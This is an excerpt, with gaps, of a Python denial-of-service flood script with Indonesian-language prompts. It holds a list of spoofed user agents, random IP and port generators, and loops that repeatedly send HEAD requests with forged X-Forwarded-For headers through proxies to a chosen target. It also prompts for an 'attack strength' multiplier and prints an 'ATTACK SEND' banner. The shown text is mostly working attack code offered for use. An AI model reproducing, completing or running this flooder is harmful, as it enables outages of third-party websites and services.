...
useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			...
			"BlackBerry8330/4.3.0 Produksi/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
...
def randomip():
  ...
  return randip
def randomport():
  randpo = ".".join(str(random.randint(0, 8888)) for _ in range(1))
  return randpo
...
def attack():
  ...
  while True:
    try:
      ...
      print(f"Attacking Start {randomip()}:{randomport()} To {ip}:{port}")
    except socket.error:
      sleep(0)
    except:
      pass
def attack2():
  ...
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + useragent + forward + "\r\n\r\n"
  proxy = random.choice(proxies).strip().split(":")
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((str(proxy[0]), int(proxy[1])))
      #Attack starts here
      for y in range(multiple):
          atk.send(str.encode(request))
      print("Attackings Start "+ str(proxy[0]+":"+proxy[1]) +f" To {ip}:{port} [true]")
    except socket.error:
      sleep(0)
    except:
      pass
    print("Attackings Start "+ str(proxy[0]+":"+proxy[1]) +f" To {ip}:{port} With Full Power")
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Kekuatan Serangan (100): "))
	except ValueError:
...
os.system("clear")
print(f"""\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[32mATTACK SEND  \033[36m---- \033[35m╚═════════╗
\033[35m║ \033[93mIP\t\t   \033[36m> \033[32m{ip}     \033[35m
\033[35m║ \033[32mPORT\t\t   \033[36m> \033[32m{port}     \033[35m
\033[35m║ \033[32mMETHODS\t \033[36m  > \033[32m[GET+POST+HEAD] \033[35m
\033[35m╚══════════════════════════════════╝
""")
def send2attack():
